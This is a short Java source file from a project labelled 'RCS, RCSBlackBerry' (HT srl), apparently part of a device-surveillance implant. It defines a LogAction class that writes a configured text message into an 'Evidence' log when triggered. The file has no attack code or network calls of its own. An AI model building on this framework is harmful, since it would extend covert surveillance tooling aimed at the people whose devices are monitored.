//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action;

import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;

public class LogAction extends SubAction {

    //#ifdef DEBUG
    static Debug debug = new Debug("LogAction", DebugLevel.VERBOSE);
    //#endif

    private String msg;

    public LogAction(ConfAction conf) {
        super(conf);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Trigger triggeringEvent) {
        if (msg != null && msg.length() > 0) {
            Evidence.info(msg);
            return true;
        } else {
            return false;
        }
    }

    protected boolean parse(ConfAction params) {
        try {
            this.msg = params.getString("text");
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse");
            //#endif
            return false;
        }

        return true;
    }

}
